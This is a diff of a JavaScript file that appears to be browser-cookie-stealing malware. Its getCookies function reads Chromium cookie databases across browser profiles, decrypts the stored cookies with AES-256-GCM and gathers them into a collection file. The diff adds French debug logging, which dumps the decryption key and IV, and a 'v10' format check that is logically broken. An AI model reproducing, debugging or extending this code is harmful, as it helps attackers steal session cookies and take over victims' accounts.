@@ -3647,6 +3647,7 @@ async function getCookies() {
         const networkPath = path.join(browserPath[i][0], 'Network');
 
         if (!fs.existsSync(path.join(networkPath, 'Cookies'))) {
+            console.log(`Fichier Cookies introuvable pour ${browserPath[i][0]}`);
             continue;
         }
 
@@ -3658,6 +3659,7 @@ async function getCookies() {
         }
 
         const cookiesPath = path.join(networkPath, 'Cookies');
+        console.log(`Lecture de ${cookiesPath}`);
         const db = new sqlite3.Database(cookiesPath);
 
         await new Promise((resolve) => {
@@ -3665,15 +3667,27 @@ async function getCookies() {
                 'SELECT * FROM cookies',
                 function (err, row) {
                     if (err) {
-                        console.error(`Error reading cookies from ${cookiesPath}:`, err);
+                        console.error(`Erreur lecture cookies de ${cookiesPath}:`, err);
                         return;
                     }
 
                     let encryptedValue = row.encrypted_value;
+                    if (!encryptedValue.slice(0, 3).toString() === 'v10') {
+                        console.log(`Format non supporté pour ${row.host_key}`);
+                        return;
+                    }
+
                     let iv = encryptedValue.slice(3, 15);
                     let encryptedData = encryptedValue.slice(15, encryptedValue.length - 16);
                     let authTag = encryptedValue.slice(encryptedValue.length - 16, encryptedValue.length);
                     let decrypted = '';
+
+                    console.log(`Déchiffrement pour ${row.host_key}:`, {
+                        key: browserPath[i][3].toString('hex'),
+                        iv: iv.toString('hex'),
+                        encryptedDataLength: encryptedData.length,
+                        authTag: authTag.toString('hex'),
+                    });
 
                     try {
                         const decipher = crypto.createDecipheriv('aes-256-gcm', browserPath[i][3], iv);
@@ -3704,7 +3718,8 @@ async function getCookies() {
                             }
                         }
                     } catch (error) {
-                        console.error(`Error decrypting cookies for ${row.host_key}:`, error);
+                        console.error(`Erreur déchiffrement pour ${row.host_key}:`, error.message, error.stack);
+                        return;
                     }
 
                     if (!cookiesData[`${browserFolder}_${browserPath[i][1]}`]) {
@@ -3756,7 +3771,7 @@ async function getCookies() {
                 // Move the cookies file to the main folder
                 moveFileToFolder(cookiesFilePath, 'Cookies');
             } catch (error) {
-                console.error(`Error writing/moving cookies file ${cookiesFilePath}:`, error);
+                console.error(`Erreur écriture/déplacement fichier cookies ${cookiesFilePath}:`, error);
             }
         }
     }
